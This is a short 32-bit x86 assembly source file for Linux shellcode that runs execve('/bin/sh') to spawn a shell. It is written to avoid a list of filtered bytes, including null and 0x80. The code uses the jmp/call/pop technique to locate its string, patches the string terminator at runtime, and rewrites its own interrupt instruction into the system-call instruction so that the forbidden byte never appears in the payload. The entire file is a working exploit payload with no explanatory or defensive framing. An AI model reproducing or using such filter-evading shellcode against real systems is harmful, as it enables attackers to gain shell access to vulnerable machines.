# execve("/bin/sh", ["/bin/sh"], NULL)
# without {0x89,0x90,0x99,0x80,0xc0,0xe1,0xb0,0x00}

.code32

jmp data

start:
popl	%ebp
xorl	%ebx,%ebx
movb	%bl,7(%ebp) #replace '#'

movb	$0x40,%bl
pushl	%ebx
popl	%eax
movb	$2,%bl
mulb	%bl # ax = al * dl = 0x80
movb	%al,9(%ebp) #replace 11

jmp	execve

data:
call start
.ascii	"/bin/sh#"
interupt:
int	$0x11 #will be changed to 0x80 during execution

execve:
pushl	$11
popl	%eax

pushl	%ebp
popl	%ebx

xorl	%edx,%edx
pushl	%edx
pushl	%ebp
pushl	%esp
popl	%ecx
jmp	interupt
